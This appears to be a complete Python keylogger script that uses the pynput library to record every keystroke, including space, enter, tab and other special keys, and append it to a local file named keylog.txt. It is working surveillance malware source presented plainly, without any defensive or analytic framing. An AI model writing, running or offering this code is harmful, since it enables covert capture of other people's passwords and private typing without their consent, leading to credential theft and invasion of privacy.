from pynput.keyboard import Key, Listener

# Specify the log file
log_file = "keylog.txt"

# Function to write keystrokes to the file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        elif key == Key.tab:
            with open(log_file, "a") as f:
                f.write("\t")
        else:
            with open(log_file, "a") as f:
                f.write(f"[{key.name}]")

# Function to handle key release (not used here but needed for the Listener)
def on_release(key):
    # You can add code here to stop the keylogger (optional)
    pass

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
